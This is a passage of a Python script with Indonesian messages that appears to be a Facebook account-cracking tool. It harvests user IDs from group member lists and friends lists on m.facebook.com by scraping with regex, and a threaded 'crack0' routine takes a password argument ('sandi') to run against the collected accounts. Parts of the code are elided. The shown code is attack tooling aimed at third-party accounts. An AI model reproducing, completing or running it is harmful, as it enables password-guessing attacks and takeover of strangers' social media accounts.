...
def crack0(data, sandi):
    ...
    for i in th:
        jml0 += 1
        i.daemon = True
        cetak('\r!h[*] Persiapan  !k%d!m%s!0' % (int(float(float(jml0) / float(jml1) * 100)), '%'), 1)
        sys.stdout.flush()
        try:
            i.start()
        except KeyboardInterrupt:
...
def idgroup():
    ...
    while 1:
        ...
        try:
            ...
            cetak('\n!m[!] Hanya Bisa Mengambil !h %d id' % len(id_bgroup))
            break
...
def saring_id_group1(d):
    for i in re.findall('<h3><a href="/(.*?)fref=pb', d):
        ...
        if a not in id_bgroup:
            id_bgroup.append(a)
            cetak('\r!h[*] !p%s !hid terambil...' % len(id_bgroup), 1)
            sys.stdout.flush()
...
def saring_id_group0():
    ...
    while 1:
        ...
        cetak('!h[*] Mengecek Group....')
        a = buka('https://m.facebook.com/browse/group/members/?id=' + id_group + '&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
        nama = (' ').join(re.findall('<title>(.*?)</title>', a)[0].split()[1:])
        try:
            next = br.find_link(url_regex='/browse/group/members/').url
            break
        except:
            cetak('!m[!] Id yang anda masukan salah')
            continue

    cetak('!h[*] Mengambil Id dari group !k%s' % nama)
    try:
        saring_id_group1(a)
    except:
        if len(id_bgroup) != 0:
            cetak('!m[!] Hanya dapat mengambil !p%d id' % len(id_bgroup))

    return next


def saring_id_teman(r):
    for i in re.findall('/friends/hovercard/mbasic/\\?uid=(.*?)&', r):
        id_bteman.append(i)
